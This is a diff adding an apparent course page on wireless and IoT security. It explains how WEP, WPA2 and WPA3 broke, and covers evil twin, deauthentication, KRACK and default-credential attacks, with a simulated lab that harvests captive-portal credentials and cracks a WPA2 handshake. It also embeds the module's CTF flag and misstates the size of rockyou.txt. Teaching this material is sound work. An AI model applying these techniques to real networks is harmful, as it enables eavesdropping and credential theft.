+      box-shadow: 0 0 15px rgba(168, 85, 247, 0.2);
+    }
+
+    .flag-badge {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      letter-spacing: 0.2em;
+      color: var(--amber);
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 0.5rem;
+    }
+  </style>
+</head>
+<body>
+  <nav>  
+    <div style="display:flex;align-items:center;gap:1.5rem">   
+      <span class="nav-logo">CyberNet — Module 04</span>  
+    </div>  
+    <div style="display:flex;align-items:center;gap:10px">    
+      <div class="nav-bar"><div class="nav-bar-fill" id="navFill"></div></div>    
+      <span class="nav-pct" id="navPct">0%</span>  
+    </div>
+  </nav>
+
+  <section class="hero">  
+    <svg class="hero-rf" viewBox="0 0 1200 700" preserveAspectRatio="xMidYMid slice">    
+      <defs>      
+        <radialGradient id="rfGrad" cx="50%" cy="50%">
+          <stop offset="0%" stop-color="#a855f7" stop-opacity="0.15"/>
+          <stop offset="100%" stop-color="#a855f7" stop-opacity="0"/>
+        </radialGradient>    
+      </defs>    
+      <ellipse cx="600" cy="350" rx="500" ry="300" fill="url(#rfGrad)"/>    
+      <g fill="none" stroke="#a855f7" stroke-opacity="0.08">      
+        <ellipse cx="600" cy="350" rx="80" ry="48"/><ellipse cx="600" cy="350" rx="160" ry="96"/>      
+        <ellipse cx="600" cy="350" rx="240" ry="144"/><ellipse cx="600" cy="350" rx="320" ry="192"/>      
+        <ellipse cx="600" cy="350" rx="400" ry="240"/><ellipse cx="600" cy="350" rx="480" ry="288"/>    
+      </g>    
+      <circle r="4" fill="#a855f7" opacity="0.8">      
+        <animateMotion dur="3s" repeatCount="indefinite" path="M600,350 Q700,280 800,250 T1100,200"/>    
+      </circle>    
+      <circle r="3" fill="#c084fc" opacity="0.6">      
+        <animateMotion dur="4s" repeatCount="indefinite" begin="0.8s" path="M600,350 Q500,280 400,300 T100,250"/>    
+      </circle>    
+      <circle r="3.5" fill="#a855f7" opacity="0.5">      
+        <animateMotion dur="3.5s" repeatCount="indefinite" begin="1.5s" path="M600,350 Q650,420 700,480 T900,600"/>    
+      </circle>  
+    </svg>  
+    <span class="hero-corner tl">CYBERNET.EDU / MOD-04</span>  
+    <span class="hero-corner tr">CLASSIFICATION: EDUCATIONAL<br>RF SPECTRUM OPERATIONS</span>  
+    <span class="hero-corner bl">v2.4.1 — STABLE BUILD</span>  
+    <span class="hero-corner br">EST. DURATION: 55–70 MIN</span>  
+    <div class="hero-inner">    
+      <div class="hero-tag">Module 04 — Wireless &amp; IoT Security</div>    
+      <h1>Invisible<br><em>Airwaves</em></h1>    
+      <p class="hero-sub">WEP · WPA2 · WPA3 · EVIL TWIN · ROGUE AP · 4-WAY HANDSHAKE · AIRCRACK-NG · BLUESNARFING · KRACK</p>    
+      <div class="story-box">      
+        <div class="story-label">📡 The Air Around You Is Not Empty</div>      
+        <p>        You're sitting somewhere right now. Maybe a coffee shop. Maybe your bedroom. Maybe a university library. <strong>Close your eyes and picture the air around you.</strong> It looks empty. It is not.      </p>      
+        <p>        Right now, invisible radio waves are passing through your body carrying fragments of other people's conversations, passwords, emails, and login sessions. Your neighbour's router is broadcasting its network name — its SSID — on 2.4 GHz and 5 GHz simultaneously, advertising its existence to every device within 100 metres. <em>Including yours. Including an attacker's.</em>      </p>      
+        <p>        Here's the uncomfortable truth: the password protecting your home Wi-Fi is probably in a file that anyone can download. A <span class="story-stat">10 GB wordlist called "rockyou.txt"</span> contains <span class="story-stat">14,344,391 real passwords</span> leaked from actual data breaches. If your Wi-Fi password is a word, a name, a date, or anything a human would naturally choose — it's almost certainly in that file. A laptop running <code>aircrack-ng</code> will crack it in <strong>under 60 seconds.</strong>      </p>      
+        <p>        And that's just the beginning. WEP — the original Wi-Fi encryption standard — can be cracked in <em>under 60 seconds</em> with freely available tools. WPA2 (what most of your devices use today) has a critical vulnerability in its handshake that lets an attacker capture the authentication exchange without ever knowing the password first. WPA3 is the fix — but most routers still run WPA2. This module is the story of how we got here, and how attackers exploit every step of the journey.      </p>    
+      </div>    
+      <div class="hero-objectives">      
+        <div class="hero-obj-item"><span class="hero-obj-icon">OBJ 01</span><span class="hero-obj-text">Understand WEP/WPA2/WPA3 — the evolution of Wi-Fi security and where each broke</span></div>      
+        <div class="hero-obj-item"><span class="hero-obj-icon">OBJ 02</span><span class="hero-obj-text">Learn Evil Twin attacks — how a fake AP tricks devices into connecting to the attacker</span></div>      
+        <div class="hero-obj-item"><span class="hero-obj-icon">OBJ 03</span><span class="hero-obj-text">Understand the WPA2 4-way handshake and how deauth forces its capture</span></div>      
+        <div class="hero-obj-item"><span class="hero-obj-icon">OBJ 04</span><span class="hero-obj-text">Explore Bluetooth & IoT attack surfaces — BlueSnarfing, KRACK, default credentials</span></div>      
+        <div class="hero-obj-item"><span class="hero-obj-icon">LAB</span><span class="hero-obj-text">3-phase lab: Radio visualiser → Evil Twin AP → Deauth + dictionary crack</span></div>    
+      </div>    
+      <a href="#section-proto" class="btn-start">Tune In →</a>  
+    </div>
+  </section>
+  <hr class="section-divider">
+
+  <div class="section" id="section-proto">  
+    <div class="section-tag"><span class="section-num">01 / 04</span> The Arms Race</div>  
+    <h2>WEP → WPA2 → WPA3:<br>A History of <em>Breaking Things</em></h2>  
+    <div class="explainer">    
+      <p>Wi-Fi security is a story of cryptographers building locks and other cryptographers picking them. Each generation of wireless security protocol was considered unbreakable when it launched. Each one eventually fell. Understanding <em>how</em> each one broke tells you exactly what the next one had to fix.</p>  
+    </div>  
+    <div class="proto-timeline">    
+      <div class="proto-item">      
+        <div class="proto-year">1997</div>      
+        <div class="proto-line"><div class="proto-dot wep"></div><div class="proto-connector"></div></div>      
+        <div class="proto-card">        
+          <div class="proto-card-head">          
+            <span class="proto-card-name">WEP</span>          
+            <span class="proto-card-status status-broken">COMPLETELY BROKEN</span>        
+          </div>        
+          <p><strong>Wired Equivalent Privacy</strong> — the original Wi-Fi encryption standard, designed to provide the same privacy as a wired connection. It used the RC4 stream cipher with a 40-bit key. Sounds reasonable for 1997.</p>        
+          <p>The catastrophic flaw: WEP reused its <strong>Initialisation Vectors (IVs)</strong> — short 24-bit random values that are supposed to make each encrypted packet unique. With only 16 million possible IVs and a busy network generating thousands of packets per second, IVs repeat within minutes. An attacker captures enough packets with repeated IVs, runs statistical analysis, and recovers the encryption key entirely — regardless of its length.</p>        
+          <div class="proto-vuln">CRACK TIME: <span>Under 60 seconds</span> with airodump-ng + aircrack-ng on any modern laptop<br>TOOL: <span>aircrack-ng, airreplay-ng</span> — freely available, runs on a Raspberry Pi</div>      
+        </div>    
+      </div>    
+      <div class="proto-item">      
+        <div class="proto-year">2003</div>      
+        <div class="proto-line"><div class="proto-dot wpa"></div><div class="proto-connector"></div></div>      
+        <div class="proto-card">        
+          <div class="proto-card-head">          
+            <span class="proto-card-name">WPA / TKIP</span>          
+            <span class="proto-card-status status-weak">DEPRECATED / WEAK</span>        
+          </div>        
+          <p><strong>Wi-Fi Protected Access with TKIP</strong> (Temporal Key Integrity Protocol) was an emergency patch for WEP — designed to run on existing hardware while fixing the IV reuse problem. TKIP generates a new key for every packet using a mixing function.</p>        
+          <p>It fixed WEP's immediate flaw but introduced new ones. The <strong>Michael MIC algorithm</strong> used for integrity checking was vulnerable to forgery attacks. TKIP was deprecated in 2012 and is now considered broken. Still, it was never as catastrophically weak as WEP.</p>        
+          <div class="proto-vuln">VULNERABILITY: <span>MIC forgery, TKIP packet injection</span> — requires captured traffic, less trivial than WEP<br>STATUS: <span>Deprecated — devices advertising TKIP-only should be avoided entirely</span></div>      
+        </div>    
+      </div>    
+      <div class="proto-item">      
+        <div class="proto-year">2004</div>      
+        <div class="proto-line"><div class="proto-dot wpa2"></div><div class="proto-connector"></div></div>      
+        <div class="proto-card">        
+          <div class="proto-card-head">          
+            <span class="proto-card-name">WPA2 / CCMP / AES</span>          
+            <span class="proto-card-status status-strong">STRONG — BUT HANDSHAKE IS CAPTURABLE</span>        
+          </div>        
+          <p><strong>WPA2</strong> replaced TKIP with <strong>CCMP</strong> (Counter Mode with CBC-MAC Protocol) built on <strong>AES</strong> (Advanced Encryption Standard) — the same cipher used to protect classified government data. The encryption itself has never been broken.</p>        
+          <p>The vulnerability isn't in the encryption — it's in the <strong>4-way handshake</strong> that establishes the connection. This handshake can be captured by anyone in monitor mode within radio range. Once captured, it can be subjected to offline dictionary attacks. If the password is in a wordlist, it cracks. The encryption is perfect. The password is the problem.</p>        
+          <div class="proto-vuln">VULNERABILITY: <span>KRACK attack (2017) — Key Reinstallation Attack on the 4-way handshake</span><br>OFFLINE CRACK: <span>Captured handshake + dictionary/brute force — no interaction with AP needed</span></div>      
+        </div>    
+      </div>    
+      <div class="proto-item">      
+        <div class="proto-year">2018</div>      
+        <div class="proto-line"><div class="proto-dot wpa3"></div></div>      
+        <div class="proto-card">        
+          <div class="proto-card-head">          
+            <span class="proto-card-name">WPA3 / SAE</span>          
+            <span class="proto-card-status status-best">CURRENT BEST PRACTICE</span>        
+          </div>        
+          <p><strong>WPA3</strong> replaces the vulnerable 4-way handshake with <strong>SAE</strong> (Simultaneous Authentication of Equals), also known as the Dragonfly handshake. SAE provides <strong>forward secrecy</strong> — even if an attacker captures the handshake AND later learns the password, they cannot decrypt previously captured traffic.</p>        
+          <p>WPA3 also eliminates offline dictionary attacks entirely: the authentication is interactive, requiring the attacker to communicate with the AP in real time for each guess — making large-scale cracking computationally infeasible. The major limitation is adoption: most deployed routers still run WPA2.</p>        
+          <div class="proto-vuln" style="color:var(--green);border-color:rgba(0,229,160,0.2);">FORWARD SECRECY: <span style="color:var(--green)">Yes — session keys cannot be derived from captured handshakes</span><br>OFFLINE CRACK: <span style="color:var(--green)">Eliminated — authentication requires live interaction with the AP</span></div>      
+        </div>    
+      </div>  
+    </div>  
+
+    <h2 style="margin-top:3rem">The WPA2 4-Way Handshake —<br><em>Why It Can Be Captured</em></h2>  
+    <div class="explainer">    
+      <p>WPA2's encryption is unbreakable. But to establish an encrypted connection, the client and access point must agree on a shared session key — without transmitting it directly. They do this through the 4-way handshake, a cryptographic exchange that proves both sides know the password without ever sending it. The problem: <strong>the entire exchange happens over the air, in plaintext-ish frames, and any device in monitor mode can capture it.</strong></p>  
+    </div>  
+    <div class="hs-diagram">    
+      <div class="hs-header">WPA2 — 4-WAY HANDSHAKE — WHAT AN ATTACKER CAPTURES</div>    
+      <div class="hs-body">      
+        <div class="hs-actor"><div class="hs-actor-icon">💻</div><div class="hs-actor-name">CLIENT</div><div class="hs-actor-sub">Your Phone/Laptop</div></div>      
+        <div class="hs-messages">        
+          <div class="hs-msg">          
+            <div class="hs-arrow rtl"><div class="hs-arrow-line m1"></div><span class="hs-arrow-tip" style="color:var(--v)">→</span></div>          
+            <div class="hs-msg-label"><span class="msg-name">MSG 1</span> — AP→Client<br><span class="msg-desc">ANonce (random number from AP)</span></div>        
+          </div>        
+          <div class="hs-msg">          
+            <div class="hs-arrow ltr"><span class="hs-arrow-tip" style="color:var(--v-bright)">→</span><div class="hs-arrow-line m2"></div></div>          
+            <div class="hs-msg-label"><span class="msg-name">MSG 2</span> — Client→AP<br><span class="msg-desc">SNonce + MIC (proves client knows the PSK) ← CAPTURED HERE</span></div>        
+          </div>        
+          <div class="hs-msg">          
+            <div class="hs-arrow rtl"><div class="hs-arrow-line m3"></div><span class="hs-arrow-tip" style="color:var(--v)">→</span></div>          
+            <div class="hs-msg-label"><span class="msg-name">MSG 3</span> — AP→Client<br><span class="msg-desc">GTK (Group Temporal Key) encrypted</span></div>        
+          </div>        
+          <div class="hs-msg">          
+            <div class="hs-arrow ltr"><span class="hs-arrow-tip" style="color:var(--v-bright)">→</span><div class="hs-arrow-line m4"></div></div>          
+            <div class="hs-msg-label"><span class="msg-name">MSG 4</span> — Client→AP<br><span class="msg-desc">Acknowledgement — connection established</span></div>        
+          </div>      
+        </div>      
+        <div class="hs-actor"><div class="hs-actor-icon">📡</div><div class="hs-actor-name">ACCESS POINT</div><div class="hs-actor-sub">The Router</div></div>    
+      </div>    
+      <div class="hs-capture-note">⚠ An attacker in monitor mode captures MSG 1 + MSG 2. These contain enough material to run offline dictionary attacks — trying millions of passwords per second against the captured MIC until one matches.</div>  
+    </div>  
+    <div class="callout">    
+      <div class="callout-head">💡 The Deauthentication Trick</div>    
+      <p>The attacker doesn't need to wait for a client to naturally connect. They can send a <strong>deauthentication frame</strong> (a management frame that Wi-Fi has no way to authenticate) to force any connected client to disconnect. The client immediately tries to reconnect — generating a fresh handshake that the attacker captures. The entire process takes under 10 seconds.</p>  
+    </div>
+  </div>
+  <hr class="section-divider">
+
+  <div class="section" id="section-eviltwin">  
+    <div class="section-tag"><span class="section-num">02 / 04</span> Identity Theft — For Routers</div>  
+    <h2>Evil Twin &amp; Rogue APs —<br>The Network That <em>Isn't Yours</em></h2>  
+    <div class="explainer">    
+      <p>Your phone and laptop are trusting. When they scan for Wi-Fi networks, they look for a network name (SSID) they recognise. If they see "CoffeeShop_WiFi" and they've connected to it before, many devices will connect automatically — without any further verification. They don't check the router's identity. They don't verify a certificate. They just connect.</p>    
+      <p>An <strong>Evil Twin attack</strong> exploits this trust completely. An attacker creates a fake access point with the exact same SSID as a legitimate network. They typically broadcast at higher power to appear as the stronger signal. Victim devices — especially those configured to auto-connect — connect to the attacker's network instead of the real one. From this position, the attacker can intercept all traffic, serve a captive portal to steal credentials, or perform SSL stripping (Module 2).</p>    
+      <p>A <strong>Rogue Access Point</strong> is the insider threat version: an unauthorised AP plugged into a corporate network, bypassing all perimeter security. Any employee who connects to it hands the attacker a foothold inside the internal network, completely bypassing the firewall.</p>  
+    </div>  
+    <div class="concept-grid">    
+      <div class="concept-card">      
+        <span class="tag tag-red">Evil Twin AP</span>      
+        <h4>The Impersonator</h4>      
+        <span class="fullform">A fake access point broadcasting the same SSID as a legitimate network to intercept connections</span>      
+        <p>Tools like <code>hostapd-wpe</code>, <code>airbase-ng</code>, or <code>Bettercap</code> can spin up a fake AP in seconds on any laptop with a compatible Wi-Fi adapter. Combined with a DHCP server and a captive portal page, the attacker can present a convincing Wi-Fi login page that <strong>harvests credentials the moment the victim connects.</strong> The victim sees a familiar network name. They never suspect.</p>    
+      </div>    
+      <div class="concept-card">      
+        <span class="tag tag-red">Deauthentication Attack</span>      
+        <h4>The Forceful Reconnect</h4>      
+        <span class="fullform">Sending spoofed 802.11 management frames to disconnect clients from their legitimate AP</span>      
+        <p>802.11 management frames — including deauthentication frames — are <strong>unauthenticated by design</strong> in WPA2. Any device can send a deauth frame pretending to be the AP, and the client will disconnect. This is used in two ways: to force a WPA2 handshake capture, or to make a client disconnect from the real network and connect to the Evil Twin instead. WPA3 with Management Frame Protection (MFP) finally addresses this.</p>    
+      </div>    
+      <div class="concept-card">      
+        <span class="tag tag-v">Rogue AP</span>      
+        <h4>The Inside Job</h4>      
+        <span class="fullform">An unauthorised access point connected to a corporate network, bypassing perimeter defences</span>      
+        <p>A disgruntled employee or a compromised hardware supply chain can introduce a rogue AP — a small device plugged into a network port — that broadcasts a Wi-Fi network accessible from outside the building. Attackers can sit in the car park and gain direct access to the internal corporate network, completely bypassing the perimeter firewall. Detection requires <strong>wireless intrusion detection systems (WIDS)</strong> that scan for unauthorised SSIDs and BSSIDs.</p>    
+      </div>    
+      <div class="concept-card">      
+        <span class="tag tag-green">Defence: WIDS + 802.11w</span>      
+        <h4>The Shield</h4>      
+        <span class="fullform">Wireless Intrusion Detection System · IEEE 802.11w Management Frame Protection</span>      
+        <p><strong>WIDS</strong> continuously scans the RF environment for unknown SSIDs, duplicate BSSIDs, deauthentication floods, and other attack signatures. Enterprise solutions (Cisco, Aruba, Meraki) alert security teams within seconds of a rogue AP appearing. <strong>802.11w</strong> (Management Frame Protection, enabled by default in WPA3) cryptographically signs management frames — making deauth spoofing impossible. Always enable it on WPA2 networks if the AP supports it.</p>    
+      </div>  
+    </div>
+  </div>
+  <hr class="section-divider">
+
+  <div class="section" id="section-iot">  
+    <div class="section-tag"><span class="section-num">03 / 04</span> Beyond Wi-Fi</div>  
+    <h2>Bluetooth &amp; IoT —<br>The <em>Forgotten Attack Surface</em></h2>  
+    <div class="explainer">    
+      <p>Wi-Fi is only one of the wireless protocols filling the air around you. Bluetooth connects your headphones, keyboard, smartwatch, and phone. Zigbee connects your smart lights and thermostats. Z-Wave connects your smart locks. Every one of these protocols has had serious vulnerabilities — and most IoT devices never receive security updates.</p>    
+      <p>The IoT (Internet of Things) attack surface is massive and largely undefended. A 2020 study found that <strong>57% of IoT devices are vulnerable to medium- or high-severity attacks</strong>, and most run embedded Linux with default credentials that are publicly listed in manufacturer documentation — and never changed by users.</p>  
+    </div>  
+    <div class="iot-grid">    
+      <div class="iot-card">      
+        <div class="iot-card-icon">🦷</div>      
+        <h4>BlueSnarfing</h4>      
+        <span class="iot-tag">Bluetooth Classic — OBEX Protocol</span>      
+        <p>An attacker connects to a Bluetooth device without authorisation and extracts its contacts, messages, calendar entries, and files via the <strong>OBEX (Object Exchange) protocol</strong>. Affects devices with older Bluetooth implementations (pre-2.1). <strong>Requires the victim device to be discoverable</strong> — most modern devices default to non-discoverable when not actively pairing, but many users never check.</p>    
+      </div>    
+      <div class="iot-card">      
+        <div class="iot-card-icon">🔑</div>      
+        <h4>KRACK Attack</h4>      
+        <span class="iot-tag">WPA2 — Key Reinstallation</span>      
+        <p>Discovered in 2017, KRACK (Key Reinstallation Attack) exploits the WPA2 handshake's retransmission mechanism. By replaying handshake messages, an attacker forces the client to <strong>reinstall an already-used key</strong>, resetting nonces and replay counters. This can allow decryption and replay of traffic. <strong>Primarily affects clients, not APs</strong>. Patched in all major OS updates — but unpatched IoT devices remain vulnerable forever.</p>    
+      </div>    
+      <div class="iot-card">      
+        <div class="iot-card-icon">🏠</div>      
+        <h4>Default Credentials</h4>      
+        <span class="iot-tag">IoT — Authentication Failure</span>      
+        <p>The most mundane and most exploited vulnerability: IoT devices ship with default usernames and passwords (<code>admin/admin</code>, <code>root/root</code>, <code>admin/1234</code>). Mirai — the botnet that generated the 1.2 Tbps DDoS in 2016 — infected <strong>600,000 devices</strong> using exactly 62 default credential combinations. No exploit needed. Just a list and patience.</p>    
+      </div>    
+      <div class="iot-card">      
+        <div class="iot-card-icon">📡</div>      
+        <h4>BlueJacking / Bluebugging</h4>      
+        <span class="iot-tag">Bluetooth — Unsolicited Access</span>      
+        <p><strong>Bluejacking</strong> sends unsolicited messages to nearby discoverable Bluetooth devices — mostly annoying. <strong>Bluebugging</strong> is more serious: it establishes a hidden connection to the target device and uses AT commands to make calls, send messages, and access the phone book — essentially <strong>full remote control</strong> of the phone. Affected Nokia, Sony Ericsson, and early smartphones in 2004-2006.</p>    
+      </div>    
+      <div class="iot-card">      
+        <div class="iot-card-icon">⚡</div>      
+        <h4>Zigbee / Z-Wave Attacks</h4>      
+        <span class="iot-tag">Smart Home Protocols</span>      
+        <p>Zigbee and Z-Wave control smart lights, locks, thermostats, and alarms. Both use weak encryption with <strong>hardcoded or easily derivable encryption keys</strong>. Researchers have demonstrated unlocking smart locks, disabling alarms, and controlling HVAC systems by replaying captured Zigbee frames. <strong>Physical proximity (10-100m) is all that's required</strong> — no internet access needed.</p>    
+      </div>    
+      <div class="iot-card">      
+        <div class="iot-card-icon">🛡</div>      
+        <h4>Defence: Network Segmentation</h4>      
+        <span class="iot-tag">VLAN + Firewall Policy</span>      
+        <p>The most effective IoT defence: <strong>put all IoT devices on a separate VLAN</strong> with no access to the corporate or personal network. A compromised smart thermostat cannot reach your NAS drive or your work laptop if they're on different VLANs with inter-VLAN routing blocked. Update firmware religiously, change all default credentials, and disable Bluetooth discovery when not actively pairing.</p>    
+      </div>  
+    </div>  
+    <div class="callout red">    
+      <div class="callout-head">🔴 The Shodan Reality Check</div>    
+      <p>Shodan is a search engine that indexes internet-connected devices. Right now, it shows over <strong>1 million webcams, 500,000 routers, and 200,000 industrial control systems</strong> with default credentials or no authentication at all — fully accessible to anyone who searches. This is not theoretical. These are real devices, in real homes and businesses, waiting.</p>  
+    </div>
+  </div>
+  <hr class="section-divider">
+
+  <div class="section" id="section-lab">  
+    <div class="section-tag"><span class="section-num">04 / 04</span> The Handshake Heist</div>  
+    <h2>Lab: Three Phases,<br>One <em>Complete Attack</em></h2>  
+    <div class="explainer">    
+      <p>Three phases. Each builds on the last. First, visualise what Wi-Fi actually looks like as radio waves. Then set up an Evil Twin AP and watch a victim connect to it. Finally, force a WPA2 handshake capture and run a dictionary crack. By the end, you will have executed a complete wireless attack chain.</p>  
+    </div>  
+    <div class="lab-wrap">    
+      <div class="lab-header">      
+        <span class="lab-badge">📡 Live Lab</span>      
+        <span class="lab-title">The Handshake Heist — Wireless Attack Simulation</span>    
+      </div>    
+      <div class="lab-tabs">      
+        <button class="lab-tab active" id="lt0" onclick="showLabTab(0)">① Radio Waves</button>      
+        <button class="lab-tab" id="lt1" onclick="showLabTab(1)">② Evil Twin</button>      
+        <button class="lab-tab" id="lt2" onclick="showLabTab(2)">③ Deauth + Crack</button>    
+      </div>    
+      <div class="lab-body" id="lp0">      
+        <p style="font-size:15px;color:var(--text-dim);margin-bottom:1.2rem;line-height:1.75;">Wi-Fi isn't magic — it's electromagnetic radiation. The visualiser below shows packets literally riding radio waves through the air, broadcasting to every device in range. Use the controls to see how different frequencies and conditions affect the signal.</p>      
+        <div class="wave-canvas-wrap">        
+          <canvas id="waveCanvas"></canvas>        
+          <div class="wave-legend">          
+            <div class="wave-legend-item"><div class="wave-legend-dot" style="background:var(--v)"></div> 2.4 GHz packets (longer range, more penetration)</div>          
+            <div class="wave-legend-item"><div class="wave-legend-dot" style="background:var(--v-bright)"></div> 5 GHz packets (faster, shorter range)</div>          
+            <div class="wave-legend-item"><div class="wave-legend-dot" style="background:var(--amber)"></div> Captured handshake frames</div>          
+            <div class="wave-legend-item"><div class="wave-legend-dot" style="background:var(--red)"></div> Deauth frames</div>        
+          </div>      
+        </div>      
+        <div style="display:flex;gap:10px;margin-top:1rem;flex-wrap:wrap">        
+          <button class="ap-connect-btn" style="padding:8px 18px;font-size:12px" onclick="waveMode('normal')">▶ Normal Traffic</button>        
+          <button class="ap-connect-btn" style="padding:8px 18px;font-size:12px" onclick="waveMode('deauth')">⚡ Send Deauth</button>        
+          <button class="ap-connect-btn" style="padding:8px 18px;font-size:12px" onclick="waveMode('handshake')">🤝 Capture Handshake</button>      
+        </div>      
+        <div id="p0-result" style="display:none;margin-top:1rem"></div>    
+      </div>    
+      <div class="lab-body" id="lp1" style="display:none">      
+        <p style="font-size:15px;color:var(--text-dim);margin-bottom:1.2rem;line-height:1.75;">You've set up an Evil Twin access point named <strong style="color:#fff">CoffeeShop_Free_WiFi</strong> — the same SSID as the real café network. Your AP is broadcasting at higher power. The victim's device is scanning. Watch the AP scanner below and wait for the right moment.</p>      
+        <div class="ap-scanner">        
+          <div class="ap-scanner-bar">          
+            <span>📡 Wi-Fi Scanner — Monitor Mode Active</span>          
+            <span class="ap-scanner-status" id="scanStatus">⟳ Scanning...</span>        
+          </div>        
+          <div class="ap-list" id="apList"></div>      
+        </div>      
+        <p style="font-size:14px;color:var(--text-dim);margin:1rem 0;">The victim's device has detected both networks. Click <strong style="color:#fff">Connect</strong> on your Evil Twin to force their device onto your network:</p>      
+        <div id="p1-captive" style="display:none">        
+          <p style="font-size:14px;color:var(--v);font-family:var(--font-mono);margin-bottom:0.8rem;letter-spacing:0.06em;">▶ VICTIM CONNECTED — Captive portal served automatically:</p>        
+          <div class="captive-portal" id="captivePortal">          
+            <div class="captive-chrome">            
+              <div class="captive-dots">              
+                <div class="captive-dot" style="background:#ff5f57"></div>              
+                <div class="captive-dot" style="background:#febc2e"></div>              
+                <div class="captive-dot" style="background:#28c840"></div>            
+              </div>            
+              <div class="captive-url">              
+                <span>🔓</span><span style="color:#dc2626">Not secure</span>&nbsp;|&nbsp; coffeeshop-wifi.com/login            
+              </div>          
+            </div>          
+            <div class="captive-body">            
+              <div class="captive-logo">☕</div>            
+              <div class="captive-title">CoffeeShop Free WiFi</div>            
+              <div class="captive-sub">Please log in with your email to access the internet</div>            
+              <div class="captive-form">              
+                <input type="email" id="captiveEmail" placeholder="your@email.com">              
+                <input type="password" id="captivePass" placeholder="Password">              
+                <button class="captive-btn" onclick="submitCaptive()">Connect to Internet →</button>            
+              </div>            
+              <div class="captive-note">By connecting you agree to our terms of service</div>          
+            </div>        
+          </div>        
+          <div class="captive-stolen" id="captiveStolen">          
+            <div class="captive-stolen-label">⚡ Attacker's terminal — credentials received:</div>          
+            <span id="stolenCreds" style="color:var(--v)"></span>        
+          </div>      
+        </div>      
+        <div id="p1-result" style="display:none"></div>    
+      </div>    
+      <div class="lab-body" id="lp2" style="display:none">      
+        <p style="font-size:15px;color:var(--text-dim);margin-bottom:1.2rem;line-height:1.75;">Now for the WPA2 handshake heist. You're targeting the real café router — you'll force a connected client to disconnect with a deauth frame, capture the WPA2 handshake when they reconnect, then run aircrack-ng with the rockyou wordlist against the captured hash.</p>      
+        <div class="handshake-anim">        
+          <div class="hs-anim-grid">          
+            <div class="hs-anim-node" id="hn-attacker"><div class="hs-anim-icon">💀</div><div class="hs-anim-name">ATTACKER</div><div class="hs-anim-ip">Monitor Mode</div></div>          
+            <div class="hs-anim-node" id="hn-ap"><div class="hs-anim-icon">📡</div><div class="hs-anim-name">TARGET AP</div><div class="hs-anim-ip">CoffeeShop_WiFi</div></div>          
+            <div class="hs-anim-node" id="hn-client"><div class="hs-anim-icon">💻</div><div class="hs-anim-name">VICTIM CLIENT</div><div class="hs-anim-ip">Connected</div></div>        
+          </div>        
+          <div class="hs-steps" id="hsSteps">          
+            <div class="hs-step" id="hss0">[ ] Enable monitor mode on wlan0</div>          
+            <div class="hs-step" id="hss1">[ ] Start capturing on target channel</div>          
+            <div class="hs-step" id="hss2">[ ] Send deauthentication frames to victim</div>          
+            <div class="hs-step" id="hss3">[ ] Client disconnects and reconnects — handshake captured</div>          
+            <div class="hs-step" id="hss4">[ ] Run aircrack-ng dictionary attack</div>          
+            <div class="hs-step" id="hss5">[ ] Password found — WPA2 cracked</div>        
+          </div>      
+        </div>      
+        <div class="cmd-palette" id="crackCmds"></div>      
+        <div class="terminal">        
+          <div class="terminal-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="terminal-label">AIRCRACK-NG SUITE — WIRELESS ATTACK</span></div>        
+          <div class="terminal-body" id="crackOutput">          
+            <div class="term-line"><span class="term-prompt">root@kali:~#</span><span class="term-cursor"></span></div>        
+          </div>      
+        </div>      
+        <div class="crack-wrap" id="crackWrap" style="display:none">        
+          <div class="crack-label">🔓 aircrack-ng — Dictionary Attack Running</div>        
+          <div class="crack-bar-wrap"><div class="crack-bar" id="crackBar"></div></div>        
+          <div class="crack-stats">          
+            <span id="crackWords">0 words tested</span>          
+            <span id="crackSpeed">0 keys/sec</span>          
+            <span id="crackEta">ETA: calculating...</span>        
+          </div>        
+          <div class="wordlist-scroll"><div class="wordlist-inner" id="wordlistInner"></div></div>      
+        </div>      
+        <div id="p2-result" style="display:none"></div>    
+      </div>  
+    </div>
+  </div>
+  <hr class="section-divider">
+
+  <div class="section" id="section-quiz">  
+    <div class="section-tag"><span class="section-num">FINAL</span> Knowledge Check</div>  
+    <h2>From Airwaves to Armour —<br>Prove You <em>Own</em> This</h2>  
+    <p style="color:var(--text-dim);font-size:16px;margin-bottom:2rem;">Five questions across Wi-Fi protocols, attack techniques, and IoT vulnerabilities. All five to unlock Module 5.</p>  
+    <div class="quiz-wrap">    
+      <div class="quiz-header"><h4>Module 4 — Assessment</h4><span class="quiz-score" id="quizScore">0 / 5 correct</span></div>    
+      <div id="quizQuestions"></div>  
+    </div>
+  </div>
+  <div class="completion" id="completion">  
+    <div class="completion-badge">📡</div>  
+    <h2>Module 4 — <em>Complete</em></h2>  
+    <p>The air around you will never look the same. You understand how Wi-Fi encryption evolved and broke, how an attacker impersonates a legitimate network, how the WPA2 handshake is captured and cracked, and why every unpatched IoT device is a waiting foothold. One module remains — and it's the spycraft one.</p>  
+    <div class="completion-stats">    
+      <div class="stat"><span class="stat-val" id="statTime">—</span><span class="stat-label">Minutes</span></div>    
+      <div class="stat"><span class="stat-val">5/5</span><span class="stat-label">Quiz Score</span></div>    
+      <div class="stat"><span class="stat-val" id="statLab">0/3</span><span class="stat-label">Lab Phases</span></div>  
+    </div>  
+
+    <div class="futuristic-flag-card">
+      <div class="flag-badge">
+        <span>⚡</span> decrypted_key.bin <span>⚡</span>
+      </div>
+      <div style="font-family: var(--font-mono); font-size: 11px; color: var(--v-bright); letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 0.8rem; text-shadow: 0 0 8px rgba(168, 85, 247, 0.4);">
+        SYSTEM OVERRIDE SUCCESSFUL — MODULE 04 FLAG
+      </div>
+      <div class="flag-value" onclick="navigator.clipboard.writeText('sp3ctr3{3v1l_tw1n_h4nd5h4k3_cr4ck3d}'); alert('Key copied to clipboard!')" title="Click to Copy">
+        sp3ctr3{3v1l_tw1n_h4nd5h4k3_cr4ck3d}
+      </div>
+      <p style="font-size: 11px; color: var(--text-faint); margin-top: 1rem; margin-bottom: 0; font-family: var(--font-mono); letter-spacing: 0.05em;">
+        Click the container above to copy decrypted credentials to your clipboard.
+      </p>
+    </div>
+
+    <a href="#" class="btn-next">Module 5 — The Escape Artist →</a>
+  </div>
+  <div style="height:6rem"></div>
+
+  <script>
+    const startTime=Date.now();
+    let quizCorrect=new Set();
+    let labDone=[false,false,false];
+    let currentTab=0;
+
+    // ═══ PROGRESS ═══
+    function updateProgress(){  
+      const l=labDone.filter(Boolean).length/3;  
+      const q=quizCorrect.size/5;  
